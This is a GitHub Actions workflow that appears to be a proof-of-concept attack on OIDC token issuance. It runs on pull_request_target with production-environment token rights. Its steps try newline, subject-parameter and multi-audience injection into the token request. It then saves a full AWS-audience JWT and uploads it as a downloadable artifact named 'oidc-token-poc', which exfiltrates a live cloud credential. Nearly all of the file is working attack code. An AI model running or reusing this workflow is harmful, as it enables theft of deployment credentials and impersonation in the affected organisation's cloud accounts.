name: OIDC PR Target Full Token
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  oidc-full-token:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Test 1 - Standard audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Standard audience ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('aud:', c.get('aud'))
print('sub:', c.get('sub'))
print('event:', c.get('event_name'))"
      - name: Test 2 - Audience newline injection
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Newline injection audience ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('aud:', c.get('aud'))
print('sub:', c.get('sub'))" 2>/dev/null || echo "Token request rejected or failed"
      - name: Test 3 - Sub parameter injection attempt
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=attacker-injected" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Sub param injection ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('aud:', c.get('aud'))
print('sub:', c.get('sub'))" 2>/dev/null || echo "Token request rejected or failed"
      - name: Test 4 - Comma-separated audiences
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%2Chttps%3A%2F%2Faccounts.google.com" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Comma-separated audiences ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('aud:', c.get('aud'))" 2>/dev/null || echo "Failed"
      - name: Capture and decode full OIDC JWT
        run: |
          FULL_JWT=$(curl -sS \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$FULL_JWT" > /tmp/oidc_token.txt
          PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
          echo "$PAYLOAD" | python3 -c "
import sys, base64, json
d = sys.stdin.read().strip()
p = d + '=' * (4 - len(d) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))"
      - uses: actions/upload-artifact@v4
        with:
          name: oidc-token-poc
          path: /tmp/oidc_token.txt
          retention-days: 1
